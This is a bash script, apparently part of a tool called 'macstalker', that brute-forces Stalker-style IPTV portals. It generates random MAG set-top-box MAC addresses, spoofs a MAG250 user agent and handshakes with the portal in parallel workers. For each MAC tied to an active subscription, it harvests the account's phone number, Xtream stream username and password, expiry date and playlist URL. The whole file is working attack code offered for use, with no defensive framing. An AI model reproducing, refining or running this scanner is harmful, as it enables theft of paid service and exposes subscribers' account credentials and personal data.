#!/bin/bash

URL="${1%/}"

if [ -z "$URL" ]; then
    echo "Usage: $0 <portal-url> [proxy-file.txt]"
    echo "  proxy-file.txt: optional, accepted for the GUI; this scanner"
    echo "                  itself does not use proxies."
    exit 1
fi

# Optional proxy list (e.g. chosen by the GUI). The scanner generates and
# tests MACs directly; the file is only checked to exist so the GUI gets a
# clear error instead of silently running without it.
PROXY_FILE="${2:-}"
if [ -n "$PROXY_FILE" ]; then
  [ -f "$PROXY_FILE" ] || { echo "proxy file not readable: $PROXY_FILE"; exit 1; }
fi

GREEN=$'\033[0;32m'
RED=$'\033[0;31m'
YELLOW=$'\033[0;33m'
LIGHT_BLUE=$'\033[0;94m'
RESET=$'\033[0m'
CLEAR_LINE=$'\033[2K'

UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
# Very-low per-request timeout: blocked/ratelimited IPs hang ~12s before closing;
# fail fast and ignore such responses instead of stalling workers.
SCAN_TIMEOUT=2

read -rp "${YELLOW}How many MACs do you want to find? ${RESET}" max_success_count
read -rp "${YELLOW}Parallel workers? [10] ${RESET}" num_workers
num_workers=${num_workers:-10}

success_file=$(mktemp)
echo "0" > "$success_file"
hit_file=$(mktemp)


hex=(0 1 2 3 4 5 6 7 8 9 A B C D E F)

# Progress events: one plain, locked line per attempt, so the terminal and
# the GUI (macstalker_gui.py parses the "PROGRESS|" prefix) share the same
# stream without interleaved ESC sequences.
progress() {
  {
    flock -x 200
    printf 'PROGRESS|%s\n' "$1"
  } 200>"$success_file.lock"
}

scan_mac() {
  token_pat='"token":"'
  while true; do
    read -r current_count < "$success_file"
    ((current_count >= max_success_count)) && break

    MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
    cookie="mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;"

    response=$(curl -s -i --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
    # 000 / non-200 handshake (blocked, ratelimited, ...): show, try next MAC
    if [[ $response != *"200"* ]]; then
      progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
      continue
    fi

    token=""
    if [[ $response == *"$token_pat"* ]]; then
      token=${response#*"$token_pat"}
      token=${token%%'"'*}
    fi

    curl -s -o /dev/null --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"

    if ! curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml" \
      | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
      progress "scanning: $MAC [connected but no subscriptions.]"
      continue
    fi

    mac_phone=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml" \
      | jq -r '.js | "\(.mac) [\(.phone)]"')

    ffplay=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=create_link&cmd=$channel&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml" \
      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null)
    ffplay=${ffplay#ffmpeg }

    # http://host/user/pass/... -> user=$4, pass=$5 when split on "/"
    IFS=/ read -r _ _ _ xtreamuser xtreampw _ <<< "$ffplay"

    read -r exp_date max_connections active_cons <<< \
      "$(curl -s --max-time $SCAN_TIMEOUT "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" \
        | jq -r '[.user_info | .exp_date, .max_connections, .active_cons] | join(" ")')"

    live=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    vod=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    series=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=series&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    # Progress event first (plain line, parsed by the GUI), then the found
    # details under the same lock the hit_file/count update already used.
    progress "found: $mac_phone  Live:$live VOD:$vod Series:$series"
    {
      flock -x 200
      printf 'FOUND|%s|%s\n' "$MAC" "$mac_phone"
      [ -n "$exp_date" ] && [ "$exp_date" != "null" ] && \
        printf 'FOUND|-> %s/get.php?username=%s&password=%s&type=m3u_plus [max=%s active=%s]\n' \
          "$URL" "$xtreamuser" "$xtreampw" "$max_connections" "$active_cons"
      printf "%s|%s|%s|%s\n" "$MAC" "$live" "$vod" "$series" >> "$hit_file"
      # Increment under the lock: a read-modify-write outside the lock
      # loses increments when two workers race on the same value.
      read -r current_count < "$success_file"
      echo $((current_count + 1)) > "$success_file"
    } 200>"$success_file.lock"

    ((current_count + 1 >= max_success_count)) && { printf '%sTarget reached: %s MACs found.%s\n' "$LIGHT_BLUE" "$max_success_count" "$RESET"; break; }
  done
}

pids=()
trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM

for ((i=0; i<num_workers; i++)); do
  scan_mac &
  pids+=($!)
done

show_summary() {
  # Plain "SUMMARY|"-prefixed lines (was ANSI in-place output) so the GUI
  # can show the sorted hit list without parsing escape sequences.
  if [ -s "$hit_file" ]; then
    printf 'SUMMARY|Summary (sorted by total content):\n'
    awk -F'|' '{print $2+$3+$4, $0}' "$hit_file" | sort -rn | cut -d' ' -f2- | while IFS='|' read -r mac live vod series; do
      printf 'SUMMARY|  %s  Live TV: %s  VOD: %s  Series: %s\n' "$mac" "$live" "$vod" "$series"
    done
  fi
  rm -f "$success_file" "$success_file.lock" "$hit_file"
}

wait
show_summary
